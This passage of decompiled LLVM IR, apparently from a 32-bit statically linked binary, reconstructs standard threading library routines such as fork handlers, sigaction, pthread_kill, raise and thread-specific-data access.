  %v2_80565b9 = inttoptr i32 %v1_80565b9 to i8*
  store i8 1, i8* %v2_80565b9, align 1
  %v0_80565bd = load i32, i32* @ebx, align 4
  %v1_80565bd = add i32 %v0_80565bd, 28
  %v2_80565bd = inttoptr i32 %v1_80565bd to i32*
  %v3_80565bd = load i32, i32* %v2_80565bd, align 4
  store i32 %v3_80565bd, i32* %stack_var_-188, align 4
  %v1_80565c0 = inttoptr i32 %v3_80565bd to i32*
  %v2_80565c0 = call i32 @__pthread_unlock(i32* %v1_80565c0)
  %v1_80565c8 = icmp eq i32 %v3_80565b6, 0
  br i1 %v1_80565c8, label %dec_label_pc_80565d8, label %dec_label_pc_80565cc

dec_label_pc_80565cc:                             ; preds = %dec_label_pc_80565b3
  store i32 %v3_80565b6, i32* %stack_var_-188, align 4
  %v1_80565d0 = call i32 @__pthread_restart_new(i32 %v3_80565b6)
  br label %dec_label_pc_80565d8

dec_label_pc_80565d8:                             ; preds = %dec_label_pc_80565b3, %dec_label_pc_80565cc
  %v0_80565d8 = load i32, i32* bitcast (i32** @global_var_8074c80.620 to i32*), align 128
  store i32 %v0_80565d8, i32* @esi, align 4
  %v0_80565de = load i32, i32* @ebx, align 4
  %v12_80565de = icmp eq i32 %v0_80565de, %v0_80565d8
  %v1_80565e0 = icmp eq i1 %v12_80565de, false
  br i1 %v1_80565e0, label %dec_label_pc_805662e, label %dec_label_pc_80565e2

dec_label_pc_80565e2:                             ; preds = %dec_label_pc_80565d8
  %v0_80565e2 = load i32, i32* @global_var_8074c84.621, align 4
  %v2_80565e2 = icmp slt i32 %v0_80565e2, 0
  br i1 %v2_80565e2, label %dec_label_pc_805662e, label %dec_label_pc_80565eb

dec_label_pc_80565eb:                             ; preds = %dec_label_pc_80565e2
  store i32 %v0_80565d8, i32* %stack_var_-156, align 4
  %v2_80565f7 = ptrtoint i32* %stack_var_-156 to i32
  br label %dec_label_pc_80565f7

dec_label_pc_80565f7:                             ; preds = %dec_label_pc_8056613.dec_label_pc_80565f7_crit_edge, %dec_label_pc_80565eb
  %v0_8056602 = phi i32 [ %v0_8056602.pre, %dec_label_pc_8056613.dec_label_pc_80565f7_crit_edge ], [ %v0_80565e2, %dec_label_pc_80565eb ]
  store i32 %v0_8056602, i32* %stack_var_-188, align 4
  %v3_8056608 = call i32 @__libc_write(i32 %v0_8056602, i32 %v2_80565f7, i32 148)
  %v8_8056610 = icmp eq i32 %v3_8056608, -1
  %v1_8056611 = icmp eq i1 %v8_8056610, false
  br i1 %v1_8056611, label %dec_label_pc_805661d, label %dec_label_pc_8056613

dec_label_pc_8056613:                             ; preds = %dec_label_pc_80565f7
  %v0_8056613 = load i32, i32* %stack_var_-188, align 4
  %v1_8056613 = call i32 @__errno_location(i32 %v0_8056613)
  %v1_8056618 = inttoptr i32 %v1_8056613 to i32*
  %v2_8056618 = load i32, i32* %v1_8056618, align 4
  %v11_8056618 = icmp eq i32 %v2_8056618, 4
  br i1 %v11_8056618, label %dec_label_pc_8056613.dec_label_pc_80565f7_crit_edge, label %dec_label_pc_805661d

dec_label_pc_8056613.dec_label_pc_80565f7_crit_edge: ; preds = %dec_label_pc_8056613
  %v0_8056602.pre = load i32, i32* @global_var_8074c84.621, align 4
  br label %dec_label_pc_80565f7

dec_label_pc_805661d:                             ; preds = %dec_label_pc_8056613, %dec_label_pc_80565f7
  %v0_805661d = load i32, i32* @esi, align 4
  store i32 %v0_805661d, i32* @eax, align 4
  %v0_805661f = call i32 @suspend()
  store i32 0, i32* %stack_var_-188, align 4
  %v1_8056629 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_805662e

dec_label_pc_805662e:                             ; preds = %dec_label_pc_80565e2, %dec_label_pc_80565d8, %dec_label_pc_805661d
  %v1_8056633 = call i32 @__GI__exit(i32 0)
  unreachable

; uselistorder directives
  uselistorder i32 %v0_8056602, { 1, 0 }
  uselistorder i32 %v0_80565d8, { 1, 0, 2 }
  uselistorder i32 %v3_80565b6, { 2, 1, 0 }
  uselistorder i32 %v0_80565a2, { 1, 0 }
  uselistorder i32 %v2_8056545, { 2, 1, 0 }
  uselistorder i32* %stack_var_-188, { 2, 1, 3, 4, 5, 0, 6 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805662e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80565d8, { 1, 0 }
  uselistorder label %dec_label_pc_80565b3, { 2, 0, 1 }
}

define i32 @pthread_call_handlers() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp16, i32* %stack_var_-12, align 4
  %v0_805736d = load i32, i32* @eax, align 4
  store i32 %v0_805736d, i32* %ebx.global-to-local, align 4
  %v1_80573792 = icmp eq i32 %v0_805736d, 0
  %v1_805737b9 = icmp eq i1 %v1_80573792, false
  br i1 %v1_805737b9, label %dec_label_pc_8057374.lr.ph, label %dec_label_pc_805737d

dec_label_pc_8057374.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8057374

dec_label_pc_8057374:                             ; preds = %dec_label_pc_8057374.lr.ph, %dec_label_pc_8057374
  %v4_8057374 = phi i32 [ %v0_805736d, %dec_label_pc_8057374.lr.ph ], [ %v3_8057376, %dec_label_pc_8057374 ]
  %v5_8057374 = inttoptr i32 %v4_8057374 to i32*
  %v6_8057374 = load i32, i32* %v5_8057374, align 4
  call void @__pseudo_call(i32 %v6_8057374)
  %v0_8057376 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057376 = add i32 %v0_8057376, 4
  %v2_8057376 = inttoptr i32 %v1_8057376 to i32*
  %v3_8057376 = load i32, i32* %v2_8057376, align 4
  store i32 %v3_8057376, i32* %ebx.global-to-local, align 4
  %v1_8057379 = icmp eq i32 %v3_8057376, 0
  %v1_805737b = icmp eq i1 %v1_8057379, false
  br i1 %v1_805737b, label %dec_label_pc_8057374, label %dec_label_pc_8057379.dec_label_pc_805737d_crit_edge

dec_label_pc_8057379.dec_label_pc_805737d_crit_edge: ; preds = %dec_label_pc_8057374
  %v2_805737d.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805737d

dec_label_pc_805737d:                             ; preds = %dec_label_pc_8057379.dec_label_pc_805737d_crit_edge, %entry
  %v2_805737d = phi i32 [ %v2_805737d.pre, %dec_label_pc_8057379.dec_label_pc_805737d_crit_edge ], [ %tmp16, %entry ]
  ret i32 %v2_805737d

; uselistorder directives
  uselistorder i32 %v3_8057376, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8057374, { 1, 0 }
}

define i32 @fork(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8057381 = load i32, i32* @ebp, align 4
  %v0_8057382 = load i32, i32* @edi, align 4
  %v0_8057383 = load i32, i32* @esi, align 4
  %v0_8057384 = load i32, i32* @ebx, align 4
  store i32 %v0_8057384, i32* %stack_var_-16, align 4
  %v1_805738d = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_80794ac.642 to i32))
  %v0_8057392 = load i32, i32* @global_var_80794c4.643, align 4
  store i32 %v0_8057392, i32* @eax, align 4
  %v0_8057397 = load i32, i32* @global_var_80794c8.644, align 8
  store i32 %v0_8057397, i32* @ebp, align 4
  %v0_805739d = load i32, i32* @global_var_80794cc.645, align 4
  store i32 %v0_805739d, i32* @ebx, align 4
  %v0_80573a3 = call i32 @pthread_call_handlers()
  %v0_80573a8 = call i32 @__pthread_once_fork_prepare()
  %v1_80573b4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074eb0.646 to i32))
  %v0_80573b9 = call i32 @__libc_fork()
  %v1_80573c1 = icmp eq i32 %v0_80573b9, 0
  store i32 %v0_80573b9, i32* @edi, align 4
  %v1_80573c5 = icmp eq i1 %v1_80573c1, false
  br i1 %v1_80573c5, label %dec_label_pc_8057446, label %dec_label_pc_80573c7

dec_label_pc_80573c7:                             ; preds = %entry
  %v2_80573d3 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80573d3, i32* @ebx, align 4
  %v2_80573d8 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-20)
  %v3_80573e2 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-20, i32 1)
  %v3_80573ef = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_8074eb0.646 to i32), i32* nonnull %stack_var_-20)
  %v1_80573f7 = call i32 @pthread_mutexattr_destroy(i32 %v2_80573d3)
  %v2_8057407 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-20)
  %v3_8057411 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-20, i32 0)
  store i32 0, i32* @esi, align 4
  %v3_805741e = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_80794ac.642 to i32), i32* nonnull %stack_var_-20)
  %v1_8057426 = call i32 @pthread_mutexattr_destroy(i32 %v2_80573d3)
  %v0_805742e = call i32 @__pthread_reset_main_thread()
  %v0_8057433 = call i32 @__fresetlockfiles()
  %v0_8057438 = call i32 @__pthread_once_fork_child()
  %v0_805743d = load i32, i32* @ebp, align 4
  store i32 %v0_805743d, i32* @eax, align 4
  %v0_805743f = call i32 @pthread_call_handlers()
  br label %dec_label_pc_805746e

dec_label_pc_8057446:                             ; preds = %entry
  %v1_805744e = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8074eb0.646 to i32))
  %v1_805745a = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_80794ac.642 to i32))
  %v0_805745f = call i32 @__pthread_once_fork_parent()
  %v0_8057464 = load i32, i32* @ebx, align 4
  store i32 %v0_8057464, i32* @eax, align 4
  %v0_8057466 = call i32 @pthread_call_handlers()
  br label %dec_label_pc_805746e

dec_label_pc_805746e:                             ; preds = %dec_label_pc_80573c7, %dec_label_pc_8057446
  %v0_8057471 = load i32, i32* @edi, align 4
  %v2_8057473 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8057473, i32* @ebx, align 4
  store i32 %v0_8057383, i32* @esi, align 4
  store i32 %v0_8057382, i32* @edi, align 4
  store i32 %v0_8057381, i32* @ebp, align 4
  ret i32 %v0_8057471

; uselistorder directives
  uselistorder i32 ()* @pthread_call_handlers, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805746e, { 1, 0 }
}

define i32 @__GI_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp9 = ptrtoint i32* %arg2 to i32
  %stack_var_-156 = alloca i32, align 4
  %v0_8057b37 = load i32, i32* @edi, align 4
  %v0_8057b38 = load i32, i32* @esi, align 4
  %v0_8057b39 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8057b47 = load i32, i32* @global_var_8074c88.650, align 8
  %v12_8057b47 = icmp eq i32 %v1_8057b47, %arg1
  br i1 %v12_8057b47, label %dec_label_pc_8057bff, label %dec_label_pc_8057b61

dec_label_pc_8057b61:                             ; preds = %entry
  %v1_8057b61 = load i32, i32* @global_var_8074c8c.634, align 4
  %v12_8057b61 = icmp eq i32 %v1_8057b61, %arg1
  br i1 %v12_8057b61, label %dec_label_pc_8057bff, label %dec_label_pc_8057b6d

dec_label_pc_8057b6d:                             ; preds = %dec_label_pc_8057b61
  %v1_8057b6d = load i32, i32* @global_var_8074c90.628, align 16
  %v12_8057b6d = icmp eq i32 %v1_8057b6d, %arg1
  %v1_8057b73 = icmp eq i1 %v12_8057b6d, false
  br i1 %v1_8057b73, label %dec_label_pc_8057b7d, label %dec_label_pc_8057b75

dec_label_pc_8057b75:                             ; preds = %dec_label_pc_8057b6d
  %tmp22 = icmp slt i32 %arg1, 1
  %tmp23 = icmp eq i1 %tmp22, false
  br i1 %tmp23, label %dec_label_pc_8057bff, label %dec_label_pc_8057b7d

dec_label_pc_8057b7d:                             ; preds = %dec_label_pc_8057b75, %dec_label_pc_8057b6d
  %v1_8057b7f = icmp eq i32* %arg2, null
  %.pre = ptrtoint i32* %stack_var_-156 to i32
  br i1 %v1_8057b7f, label %dec_label_pc_8057b7d.dec_label_pc_8057bc8_crit_edge, label %dec_label_pc_8057b83

dec_label_pc_8057b7d.dec_label_pc_8057bc8_crit_edge: ; preds = %dec_label_pc_8057b7d
  br label %dec_label_pc_8057bc8

dec_label_pc_8057b83:                             ; preds = %dec_label_pc_8057b7d
  store i32 %.pre, i32* @esi, align 4
  %v3_8057b8f = bitcast i32* %stack_var_-156 to i16*
  %v4_8057b8f = call i32 @memcpy(i16* %v3_8057b8f, i32 %tmp9, i32 140)
  %v2_8057b97 = load i32, i32* %arg2, align 4
  %tmp = or i32 %v2_8057b97, 1
  %tmp25 = icmp eq i32 %tmp, 1
  br i1 %tmp25, label %dec_label_pc_8057bc4, label %dec_label_pc_8057b9c

dec_label_pc_8057b9c:                             ; preds = %dec_label_pc_8057b83
  %tmp24 = icmp slt i32 %arg1, 1
  br i1 %tmp24, label %dec_label_pc_8057bc4, label %dec_label_pc_8057ba0

dec_label_pc_8057ba0:                             ; preds = %dec_label_pc_8057b9c
  %v1_8057ba0 = add i32 %arg1, -64
  %v3_8057ba0 = sub i32 63, %arg1
  %v4_8057ba0 = and i32 %v3_8057ba0, %arg1
  %v5_8057ba0 = icmp slt i32 %v4_8057ba0, 0
  %v6_8057ba0 = icmp eq i32 %v1_8057ba0, 0
  %v7_8057ba0 = icmp slt i32 %v1_8057ba0, 0
  %v3_8057ba3 = icmp eq i1 %v7_8057ba0, %v5_8057ba0
  %v4_8057ba3 = icmp eq i1 %v6_8057ba0, false
  %v5_8057ba3 = and i1 %v4_8057ba3, %v3_8057ba3
  br i1 %v5_8057ba3, label %dec_label_pc_8057bc4, label %dec_label_pc_8057ba5

dec_label_pc_8057ba5:                             ; preds = %dec_label_pc_8057ba0
  %v1_8057ba5 = add i32 %tmp9, 132
  %v2_8057ba5 = inttoptr i32 %v1_8057ba5 to i8*
  %v3_8057ba5 = load i8, i8* %v2_8057ba5, align 1
  %v4_8057ba5 = and i8 %v3_8057ba5, 4
  %v5_8057ba5 = icmp eq i8 %v4_8057ba5, 0
  %. = select i1 %v5_8057ba5, i32 134576862, i32 134576788
  store i32 %., i32* %stack_var_-156, align 4
  br label %dec_label_pc_8057bc8

dec_label_pc_8057bc4:                             ; preds = %dec_label_pc_8057ba0, %dec_label_pc_8057b9c, %dec_label_pc_8057b83
  br label %dec_label_pc_8057bc8

dec_label_pc_8057bc8:                             ; preds = %dec_label_pc_8057b7d.dec_label_pc_8057bc8_crit_edge, %dec_label_pc_8057ba5, %dec_label_pc_8057bc4
  %v0_8057bca = phi i32 [ 0, %dec_label_pc_8057b7d.dec_label_pc_8057bc8_crit_edge ], [ %.pre, %dec_label_pc_8057ba5 ], [ %.pre, %dec_label_pc_8057bc4 ]
  %v3_8057bcc = inttoptr i32 %v0_8057bca to i32*
  %v4_8057bcc = call i32 @__libc_sigaction(i32 %arg1, i32* %v3_8057bcc, i32 %.pre)
  %v8_8057bd7 = icmp eq i32 %v4_8057bcc, -1
  br i1 %v8_8057bd7, label %dec_label_pc_8057c08, label %dec_label_pc_8057bda

dec_label_pc_8057bda:                             ; preds = %dec_label_pc_8057bc8
  %v1_8057bda = add i32 %arg1, -1
  %v6_8057be0 = icmp ugt i32 %v1_8057bda, 63
  br i1 %v6_8057be0, label %dec_label_pc_8057c06, label %dec_label_pc_8057be2

dec_label_pc_8057be2:                             ; preds = %dec_label_pc_8057bda
  %v1_8057be2 = icmp eq i32 %arg3, 0
  br i1 %v1_8057be2, label %dec_label_pc_8057bf0, label %dec_label_pc_8057be6

dec_label_pc_8057be6:                             ; preds = %dec_label_pc_8057be2
  %v1_8057be6 = mul i32 %arg1, 4
  %v2_8057be6 = add i32 %v1_8057be6, ptrtoint (i32* @global_var_80794e0.648 to i32)
  %v3_8057be6 = inttoptr i32 %v2_8057be6 to i32*
  %v4_8057be6 = load i32, i32* %v3_8057be6, align 4
  %v2_8057bed = inttoptr i32 %arg3 to i32*
  store i32 %v4_8057be6, i32* %v2_8057bed, align 4
  br label %dec_label_pc_8057bf0

dec_label_pc_8057bf0:                             ; preds = %dec_label_pc_8057be2, %dec_label_pc_8057be6
  br i1 %v1_8057b7f, label %dec_label_pc_8057c06, label %dec_label_pc_8057bf4

dec_label_pc_8057bf4:                             ; preds = %dec_label_pc_8057bf0
  %v2_8057bf4 = load i32, i32* %arg2, align 4
  %v2_8057bf6 = mul i32 %arg1, 4
  %v3_8057bf6 = add i32 %v2_8057bf6, ptrtoint (i32* @global_var_80794e0.648 to i32)
  %v4_8057bf6 = inttoptr i32 %v3_8057bf6 to i32*
  store i32 %v2_8057bf4, i32* %v4_8057bf6, align 4
  br label %dec_label_pc_8057c06

dec_label_pc_8057bff:                             ; preds = %dec_label_pc_8057b75, %dec_label_pc_8057b61, %entry
  br label %dec_label_pc_8057c08

dec_label_pc_8057c06:                             ; preds = %dec_label_pc_8057bf0, %dec_label_pc_8057bda, %dec_label_pc_8057bf4
  br label %dec_label_pc_8057c08

dec_label_pc_8057c08:                             ; preds = %dec_label_pc_8057bc8, %dec_label_pc_8057bff, %dec_label_pc_8057c06
  %v0_8057c0e = phi i32 [ -1, %dec_label_pc_8057bc8 ], [ 22, %dec_label_pc_8057bff ], [ 0, %dec_label_pc_8057c06 ]
  store i32 %v0_8057b39, i32* @ebx, align 4
  store i32 %v0_8057b38, i32* @esi, align 4
  store i32 %v0_8057b37, i32* @edi, align 4
  ret i32 %v0_8057c0e

; uselistorder directives
  uselistorder i32 %v1_8057ba0, { 1, 0 }
  uselistorder i32 %.pre, { 0, 3, 2, 1 }
  uselistorder i1 %v1_8057b7f, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 2, 0 }
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %arg1, { 7, 8, 9, 6, 3, 11, 10, 4, 5, 0, 1, 2, 12 }
  uselistorder label %dec_label_pc_8057c08, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8057c06, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057bf0, { 1, 0 }
  uselistorder label %dec_label_pc_8057bc8, { 2, 1, 0 }
}

define i32 @pthread_kill(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_8057d82 = load i32, i32* @esi, align 4
  store i32 0, i32* @edx, align 4
  %v0_8057d85 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8057d8f = urem i32 %arg1, 1024
  %v2_8057d94 = mul nuw nsw i32 %v1_8057d8f, 16
  %v1_8057d97 = add i32 %v2_8057d94, ptrtoint (i32* @global_var_80708a0.622 to i32)
  store i32 %v1_8057d97, i32* @esi, align 4
  store i32 %v1_8057d97, i32* @eax, align 4
  %v1_8057d9f = call i32 @__pthread_lock(i32 %v0_8057d85)
  %v0_8057da4 = load i32, i32* @esi, align 4
  %v1_8057da4 = add i32 %v0_8057da4, 8
  %v2_8057da4 = inttoptr i32 %v1_8057da4 to i32*
  %v3_8057da4 = load i32, i32* %v2_8057da4, align 4
  %v1_8057da7 = icmp eq i32 %v3_8057da4, 0
  br i1 %v1_8057da7, label %dec_label_pc_8057db0, label %dec_label_pc_8057dab

dec_label_pc_8057dab:                             ; preds = %entry
  %v1_8057dab = add i32 %v3_8057da4, 16
  %v2_8057dab = inttoptr i32 %v1_8057dab to i32*
  %v3_8057dab = load i32, i32* %v2_8057dab, align 4
  %v4_8057dab = load i32, i32* @ebx, align 4
  %v15_8057dab = icmp eq i32 %v3_8057dab, %v4_8057dab
  br i1 %v15_8057dab, label %dec_label_pc_8057dc3, label %dec_label_pc_8057db0

dec_label_pc_8057db0:                             ; preds = %dec_label_pc_8057dab, %entry
  store i32 %v0_8057da4, i32* %stack_var_-28, align 4
  %v1_8057db4 = inttoptr i32 %v0_8057da4 to i32*
  %v2_8057db4 = call i32 @__pthread_unlock(i32* %v1_8057db4)
  br label %dec_label_pc_8057dea

dec_label_pc_8057dc3:                             ; preds = %dec_label_pc_8057dab
  %v1_8057dc6 = add i32 %v3_8057da4, 20
  %v2_8057dc6 = inttoptr i32 %v1_8057dc6 to i32*
  %v3_8057dc6 = load i32, i32* %v2_8057dc6, align 4
  store i32 %v3_8057dc6, i32* @ebx, align 4
  store i32 %v0_8057da4, i32* %stack_var_-28, align 4
  %v1_8057dca = inttoptr i32 %v0_8057da4 to i32*
  %v2_8057dca = call i32 @__pthread_unlock(i32* %v1_8057dca)
  %v0_8057dd5 = load i32, i32* @ebx, align 4
  store i32 %v0_8057dd5, i32* %stack_var_-28, align 4
  %v2_8057dd6 = call i32 @kill(i32 %v0_8057dd5, i32 %arg2)
  %v8_8057de0 = icmp eq i32 %v2_8057dd6, -1
  %v1_8057de1 = icmp eq i1 %v8_8057de0, false
  br i1 %v1_8057de1, label %dec_label_pc_8057dea, label %dec_label_pc_8057de3

dec_label_pc_8057de3:                             ; preds = %dec_label_pc_8057dc3
  %v0_8057de3 = load i32, i32* %stack_var_-28, align 4
  %v1_8057de3 = call i32 @__errno_location(i32 %v0_8057de3)
  %v1_8057de8 = inttoptr i32 %v1_8057de3 to i32*
  %v2_8057de8 = load i32, i32* %v1_8057de8, align 4
  br label %dec_label_pc_8057dea

dec_label_pc_8057dea:                             ; preds = %dec_label_pc_8057dc3, %dec_label_pc_8057db0, %dec_label_pc_8057de3
  %v0_8057deb = phi i32 [ 0, %dec_label_pc_8057dc3 ], [ 3, %dec_label_pc_8057db0 ], [ %v2_8057de8, %dec_label_pc_8057de3 ]
  store i32 %v0_8057d82, i32* @esi, align 4
  ret i32 %v0_8057deb

; uselistorder directives
  uselistorder i32 %v0_8057da4, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_8057dea, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057df0 = load i32, i32* @ebx, align 4
  store i32 %v0_8057df0, i32* %stack_var_-4, align 4
  %v1_8057df4 = call i32 @__GI_pthread_self(i32 %v0_8057df0)
  %v0_8057df9 = load i32, i32* @ebx, align 4
  store i32 %v1_8057df4, i32* %stack_var_-28, align 4
  %v4_8057e00 = call i32 @pthread_kill(i32 %v1_8057df4, i32 %arg1, i32 %v0_8057df9, i32 %v0_8057df9)
  %v1_8057e0c = icmp eq i32 %v4_8057e00, 0
  br i1 %v1_8057e0c, label %dec_label_pc_8057e1a, label %dec_label_pc_8057e10

dec_label_pc_8057e10:                             ; preds = %entry
  %v0_8057e10 = load i32, i32* %stack_var_-28, align 4
  %v1_8057e10 = call i32 @__errno_location(i32 %v0_8057e10)
  %v2_8057e15 = inttoptr i32 %v1_8057e10 to i32*
  store i32 %v4_8057e00, i32* %v2_8057e15, align 4
  br label %dec_label_pc_8057e1a

dec_label_pc_8057e1a:                             ; preds = %entry, %dec_label_pc_8057e10
  %v0_8057e1d = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_8057e10 ]
  %v2_8057e1c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8057e1c, i32* @ebx, align 4
  ret i32 %v0_8057e1d

; uselistorder directives
  uselistorder i32 %v4_8057e00, { 1, 0 }
  uselistorder i32 %v1_8057df4, { 1, 0 }
  uselistorder label %dec_label_pc_8057e1a, { 1, 0 }
}

define i32 @thread_self.6(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_8057ed0 = load i32, i32* @esp, align 4
  %v1_8057ed0 = load i32, i32* @global_var_807b620.613, align 32
  %v7_8057ed0 = icmp ult i32 %v0_8057ed0, %v1_8057ed0
  %v1_8057edd = icmp eq i1 %v7_8057ed0, false
  br i1 %v1_8057edd, label %dec_label_pc_8057f0e, label %dec_label_pc_8057edf

dec_label_pc_8057edf:                             ; preds = %entry
  %v1_8057edf = load i32, i32* @global_var_807b624.614, align 4
  %v7_8057edf = icmp ult i32 %v0_8057ed0, %v1_8057edf
  br i1 %v7_8057edf, label %dec_label_pc_8057ef4, label %dec_label_pc_8057ee7

dec_label_pc_8057ee7:                             ; preds = %dec_label_pc_8057edf
  %v1_8057ee7 = load i32, i32* @global_var_807b628.615, align 8
  %v7_8057ee7 = icmp ult i32 %v0_8057ed0, %v1_8057ee7
  br i1 %v7_8057ee7, label %dec_label_pc_8057f0e, label %dec_label_pc_8057ef4

dec_label_pc_8057ef4:                             ; preds = %dec_label_pc_8057ee7, %dec_label_pc_8057edf
  %v0_8057ef4 = load i32, i32* @global_var_807f100.617, align 256
  %v1_8057ef4 = icmp eq i32 %v0_8057ef4, 0
  br i1 %v1_8057ef4, label %dec_label_pc_8057f02, label %dec_label_pc_8057efd

dec_label_pc_8057efd:                             ; preds = %dec_label_pc_8057ef4
  %v0_8057efd = call i32 @__pthread_find_self()
  br label %dec_label_pc_8057f02

dec_label_pc_8057f02:                             ; preds = %dec_label_pc_8057ef4, %dec_label_pc_8057efd
  %v2_8057f08 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_8057f0e

dec_label_pc_8057f0e:                             ; preds = %dec_label_pc_8057ee7, %entry, %dec_label_pc_8057f02
  %v0_8057f0e = phi i32 [ ptrtoint (i32* @global_var_8074aa0.616 to i32), %dec_label_pc_8057ee7 ], [ ptrtoint (i32* @global_var_80748c0 to i32), %entry ], [ %v2_8057f08, %dec_label_pc_8057f02 ]
  ret i32 %v0_8057f0e

; uselistorder directives
  uselistorder label %dec_label_pc_8057f0e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057f02, { 1, 0 }
}

define i32 @__pthread_internal_tsd_get(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8057f2b = call i32 @thread_self.6(i32 ptrtoint (i32* @0 to i32))
  %v2_8057f34 = mul i32 %arg1, 4
  %v3_8057f34 = add i32 %v2_8057f34, 364
  %v4_8057f34 = add i32 %v3_8057f34, %v1_8057f2b
  %v5_8057f34 = inttoptr i32 %v4_8057f34 to i32*
  %v6_8057f34 = load i32, i32* %v5_8057f34, align 4
  ret i32 %v6_8057f34
}

define i32 @__pthread_internal_tsd_set(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_8057f42 = call i32 @thread_self.6(i32 ptrtoint (i32* @0 to i32))
  %v3_8057f4f = mul i32 %arg1, 4
  %v4_8057f4f = add i32 %v3_8057f4f, 364
  %v5_8057f4f = add i32 %v4_8057f4f, %v1_8057f42
  %v6_8057f4f = inttoptr i32 %v5_8057f4f to i32*
  store i32 %arg2, i32* %v6_8057f4f, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 364, { 1, 0 }
}

define i32 @__pthread_destroy_specifics() local_unnamed_addr {
dec_label_pc_8058012:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8057f99 = load i32, i32* @ebp, align 4
  store i32 0, i32* @ebp, align 4
  %v0_8057f9c = load i32, i32* @edi, align 4
  %v0_8057f9d = load i32, i32* @esi, align 4
  %v0_8057f9e = load i32, i32* @ebx, align 4
  store i32 %v0_8057f9e, i32* %stack_var_-16, align 4
  %v1_8057fa2 = call i32 @thread_self.6(i32 %v0_8057f9e)
  store i32 %v1_8057fa2, i32* @esi, align 4
  %v0_8058012.pre = load i32, i32* @ebp, align 4
  %v1_8058012 = add i32 %v0_8058012.pre, -3
  %v6_8058012 = sub i32 2, %v0_8058012.pre
  %v7_8058012 = and i32 %v6_8058012, %v0_8058012.pre
  %v8_8058012 = icmp slt i32 %v7_8058012, 0
  %v9_8058012 = icmp eq i32 %v1_8058012, 0
  %v10_8058012 = icmp slt i32 %v1_8058012, 0
  %v3_8058015 = icmp eq i1 %v10_8058012, %v8_8058012
  %v4_8058015 = icmp eq i1 %v9_8058012, false
  %v5_8058015 = and i1 %v4_8058015, %v3_8058015
  br i1 %v5_8058015, label %dec_label_pc_8058023, label %dec_label_pc_8058017

dec_label_pc_8057fb3:                             ; preds = %dec_label_pc_8058004.dec_label_pc_8057fb3_crit_edge, %dec_label_pc_8058017
  %v0_8057fb5 = phi i32 [ %v1_8057fa2, %dec_label_pc_8058017 ], [ %v0_8057fb5.pre, %dec_label_pc_8058004.dec_label_pc_8057fb3_crit_edge ]
  %v0_8058004.pre23 = phi i32 [ 0, %dec_label_pc_8058017 ], [ %v1_8058004, %dec_label_pc_8058004.dec_label_pc_8057fb3_crit_edge ]
  store i32 0, i32* @edi, align 4
  %v2_8057fb5 = mul i32 %v0_8058004.pre23, 4
  %v3_8057fb5 = add i32 %v2_8057fb5, 236
  %v4_8057fb5 = add i32 %v3_8057fb5, %v0_8057fb5
  %v5_8057fb5 = inttoptr i32 %v4_8057fb5 to i32*
  %v6_8057fb5 = load i32, i32* %v5_8057fb5, align 4
  %v7_8057fb5 = icmp eq i32 %v6_8057fb5, 0
  %v1_8057fbd = icmp eq i1 %v7_8057fb5, false
  br i1 %v1_8057fbd, label %dec_label_pc_8057fff.preheader, label %dec_label_pc_8058004

dec_label_pc_8057fff.preheader:                   ; preds = %dec_label_pc_8057fb3
  br label %dec_label_pc_8057fc1

dec_label_pc_8057fc1:                             ; preds = %dec_label_pc_8057ffe.dec_label_pc_8057fc1_crit_edge, %dec_label_pc_8057fff.preheader
